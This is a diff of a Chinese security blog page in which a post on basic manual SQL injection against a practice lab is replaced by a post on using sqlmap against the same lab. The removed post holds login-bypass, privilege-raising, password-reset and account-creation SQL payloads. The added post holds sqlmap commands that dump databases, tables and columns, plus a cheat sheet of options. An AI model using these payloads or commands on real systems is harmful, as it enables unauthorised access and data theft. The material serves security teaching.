@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="（一）SQL注入—基础, Wkai">
+    <meta name="keywords" content="（二）SQL注入—sqlmap注入, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>（一）SQL注入—基础 | Wkai</title>
+    <title>（二）SQL注入—sqlmap注入 | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -245,12 +245,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(8).png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(1).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">（一）SQL注入—基础</h1>
+                    <h1 class="description center-align post-title">（二）SQL注入—sqlmap注入</h1>
                 </div>
             </div>
         </div>
@@ -383,7 +383,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-31
+                    2020-08-05
                 </div>
                 
 
@@ -400,102 +400,86 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <ul>
-<li>在SQL注入的过程中，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利，比如攻击者在参数中输入一个单引号<code>&#39;</code>， 引起执行查询语句的语法错误，服务器直接返回了错误信息。</li>
-<li>下面我们来看个例子    地址：<a href="https://tofu.exeye.run/sql/log_page" target="_blank" rel="noopener">https://tofu.exeye.run/sql/log_page</a></li>
-<li>这是一个登录页面</li>
+<li>上篇我们说到如何利用报错信息进行sql注入，那么本篇我们将会使用工具sqlmap对网站进行爆炸库</li>
+<li>还是上篇的靶场，地址：<a href="https://tofu.exeye.run/sql/log_page" target="_blank" rel="noopener">https://tofu.exeye.run/sql/log_page</a></li>
 </ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(8).png" alt="登录界面"></p>
+<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(5).png" alt="登录界面"></p>
 <ul>
-<li>这个登录界面给了我们默认的账户名：<code>staff_jack</code></li>
-<li>然后我们随便输入一个密码，开启抓包，点击登录</li>
+<li>因为登录发出的是POST请求，所以我们首先需要用burp先开启抓包，随便输入用户名和密码，点击登录</li>
 </ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard.png" alt></p>
+<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(2).png" alt="网站发起的POST请求"></p>
 <ul>
-<li>将这个包发送到<code>Repeater</code>,直接发送，我们可以看到响应的信息提示账号密码错误</li>
+<li>然后将POST请求复制到记事本里保存为1.txt</li>
 </ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(7).png" alt></p>
+<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(4).png" alt></p>
 <ul>
-<li>那么我们将123直接改成一个单引号<code>&#39;</code>看看能不能造成语法错误，让他回显错误</li>
-<li>点击Go收到响应，可以看到确实收到错误代码，而且提示了sql语法错误</li>
-</ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(10).png" alt></p>
-<ul>
-<li><p>所以这个地方可能存在sql注入，接下来我们可以尝试在语句中加入or‘1=1’让语句无条件返回正确值</p>
+<li><p>然后在当前目录开启终端，需要用到的命令为</p>
 </li>
-<li><p>那么就应该在密码处输入</p>
-</li>
-<li><pre class=" language-sql"><code class="language-sql"><span class="token number">123</span>'<span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#  </span>
-<span class="token comment" spellcheck="true">#这里123后面的单引号是为了闭合前面的引号,#是为了注释掉后面的引号</span>
-<span class="token comment" spellcheck="true">#所以构造的语句完整是</span>
-<span class="token keyword">select</span> s_user<span class="token punctuation">,</span>s_power <span class="token keyword">from</span> staff <span class="token keyword">where</span> s_user <span class="token operator">=</span><span class="token string">'staff_jack'</span> <span class="token operator">and</span> s_psw <span class="token operator">=</span><span class="token string">'123'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span></code></pre>
-</li>
+<li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw --dbs           
+-p参数意思是指定参数psw进行注入，因为上篇我们手动测试到密码处有注入点
+--dbs的意思是爆出数据库名称</code></pre></li>
 </ul>
 <ul>
-<li>改完密码后提交后响应内容是这样的</li>
+<li>运行该命令，爆出数据库的所有库名</li>
 </ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(4).png" alt></p>
+<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(1).png" alt="sqlmap正在尝试注入"></p>
 <ul>
-<li>可以看到返回的code值为0，但是权限不够，直接登录网站也可以看到</li>
+<li>成功爆出两个库名，<code>information_schema</code>和<code>twosecu1_ques_2</code></li>
 </ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(1).png" alt></p>
+<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(6).png" alt></p>
 <ul>
-<li><p>我猜想响应内容中，<code>s_power</code>字段应该就是用来标记权限用的</p>
+<li><p>接下来选择一个数据库继续深入，我选择的是库<code>information_schema</code>，查看有哪些表，运行命令为：</p>
 </li>
-<li><p>既然可以注入’1=1‘，那为什么不可以直接注入update的语句将权限字段改为1呢</p>
-</li>
-<li><p>所以要修改权限，payload就应该改成这样：</p>
-</li>
-<li><pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' OR '</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">';update staff set s_power=1 where s_user='</span>staff_bob'<span class="token comment" spellcheck="true">#</span>
-这段的意思从表staff中找出用户staff_bob，然后将权限字段s_power<span class="token operator">=</span><span class="token number">1</span>改为<span class="token number">1</span></code></pre>
-</li>
+<li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw -D information_schema --tables
+-D的参数是指定数据库名
+--tables参数意思是列出数据库的所有表名</code></pre></li>
 </ul>
 <ul>
-<li>接下来再看看响应内容，可以看到返回的是404 not found</li>
+<li>运行命令，可以得到指定数据库的所有表名</li>
 </ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(9).png" alt></p>
+<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(3).png" alt></p>
 <ul>
-<li>返回404，说明我们的代码可能执行成功了，导致后端没有返回值</li>
-<li>接着我们可以尝试下重新登录账号，成功修改权限拿到flag</li>
+<li><p>同理，获得一个表名之后我们也可以指定他的字段,比如列出表<code>ALL_PLUGINS</code>的字段</p>
+</li>
+<li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw -D information_schema -T ALL_PLUGINS --columns
+参数-T是指定表名的意思
+--columns 列出指定表的所有字段</code></pre></li>
 </ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(5).png" alt></p>
+<ul>
+<li>运行命令，查看<code>ALL_PLUGINS</code>的字段</li>
+</ul>
+<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard.png" alt></p>
+<ul>
+<li><p>最后就是爆出字段的内容了，运行命令为：</p>
+</li>
+<li><pre><code>sqlmap -r &quot;1.txt&quot; -p psw -D information_schema -T ALL_PLUGINS -C PLUGIN_LIBRARY --dump
+参数-C 用于指定字段名
+--dump 爆出字段的值</code></pre></li>
+</ul>
+<ul>
+<li>运行命令，就能列出该字段的所有值了</li>
+</ul>
+<p><img src="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/clipboard(7).png" alt></p>
+<ul>
+<li>所以只要有注入点，就能够指定参数，用sqlmap就能很方便地列出数据库所有的数据。</li>
+</ul>
 <br>
 
 <ul>
-<li>通过分析上述操作，其实我们可以更进一步，修改已经有的密码或者创建自己的管理员账号</li>
-<li>那么就来试试吧</li>
-</ul>
-<br>
+<li><p>拓展：sqlmap常用命令</p>
+<p>检查注入点 </p>
+<pre><code>sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; </code></pre><br>
 
-<ul>
-<li>首先尝试构造语句，尝试直接修改<code>staff_bob</code>的密码</li>
+<p>列数据库信息 </p>
+<pre><code>sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; --dbs </code></pre><p><br>指定数据库名列出所有表</p>
+<pre><code> sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; -D dbsname --tables </code></pre><p><br>指定数据库名表名列出所有字段</p>
+<pre><code> sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; -D dbsname -T tablename --columns </code></pre><p><br>指定数据库名表名字段dump出指定字段</p>
+<pre><code>sqlmap -u &quot;http://ooxx.com/a.php?id=1&quot; -D dbsname -T tablename -C columnname --dump </code></pre><p><br>cookie 注入      </p>
+<pre><code>--cookie=COOKIE                 在需要登录的地方，需要登录后的cookie </code></pre><p><br>执行指定的 SQL 语句 </p>
+<pre><code>--sql-query=QUERY </code></pre><p><br>代理注入</p>
+<pre><code> --proxy=&quot;(http|https|socks4|socks5)://127.0.0.1:8087&quot;    支持多种协议</code></pre><p><br>POST注入</p>
+<pre><code>sqlmap -r 1.txt                     如果cookie很长，或者需要使用post注入，请抓包将数据存入1.txt中</code></pre></li>
 </ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(6).png" alt></p>
-<ul>
-<li><pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' OR 1=1;update staff set s_psw='</span><span class="token number">123456</span><span class="token string">' where s_user='</span>staff_bob' <span class="token comment" spellcheck="true">#</span>
-<span class="token comment" spellcheck="true">#这段的意思是从表中找出用户staff_bob，然后将密码设置为123456</span></code></pre>
-</li>
-<li><p>然后尝试用123456登录，登录成功，但是不知道为啥，权限又变回了0，可能是靶场的规则吧</p>
-</li>
-</ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(3).png" alt></p>
-<ul>
-<li><p>接着我们试试能不能直接创建一个账户</p>
-<ul>
-<li><p>目前已经知道的字段有<code>s_user</code>、<code>s_psw</code>、<code>s_power</code></p>
-</li>
-<li><p>构造payload</p>
-<ul>
-<li><pre class=" language-sql"><code class="language-sql"><span class="token number">123</span><span class="token string">' OR 1=1;INSERT INTO  staff (s_user,s_psw,s_power) VALUES ('</span>wkai<span class="token string">','</span>wkai<span class="token string">','</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
-<span class="token comment" spellcheck="true">#向表staff中插入用户名wkai，密码wkai，权限1</span></code></pre>
-</li>
-<li><p>最后再用wkai这个账号登录，发现不仅能登录，而且权限也直接是1</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(2).png" alt></p>
 
             </div>
             <hr/>
@@ -521,7 +505,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/">http://wkaiblog.cn/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/</a>
+                    <a href="http://wkaiblog.cn/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/">http://wkaiblog.cn/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -728,9 +712,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/08/05/%EF%BC%88%E4%BA%8C%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94sqlmap%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
@@ -753,9 +738,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-08-05
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -764,6 +749,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -782,28 +768,25 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/">
+                <a href="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/30/%EF%BC%88%E5%85%AD%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8/clipboard(10).png" class="responsive-img" alt="（六）跨站脚本XSS之数据库存储">
+                        <img src="/2020/07/31/%EF%BC%88%E4%B8%80%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%9F%BA%E7%A1%80/clipboard(8).png" class="responsive-img" alt="（一）SQL注入—基础">
                         
-                        <span class="card-title">（六）跨站脚本XSS之数据库存储</span>
+                        <span class="card-title">（一）SQL注入—基础</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一 靶场说明
-本篇是对存储型xss的认识和利用。绕过过滤的方法也用到了前面介绍过的几个技巧。除此之外，我还分析了下靶场的实现原理。
-
-需要用到的技能：拼接绕过，引号转换
-
-靶场地址：https://tofu.exeye.run/commit
+                            
+在SQL注入的过程中，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利，比如攻击者在参数中输入一个单引号&#39;， 引起执行查询语句的语法错误，服务器直接返回了错误信息。
+下面我们来看个例子    地址：https://
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-31
                             </span>
                         <span class="publish-author">
                             
@@ -816,8 +799,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/xss/">
-                        <span class="chip bg-color">xss</span>
+                    <a href="/tags/%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">注入</span>
                     </a>
                     
                 </div>
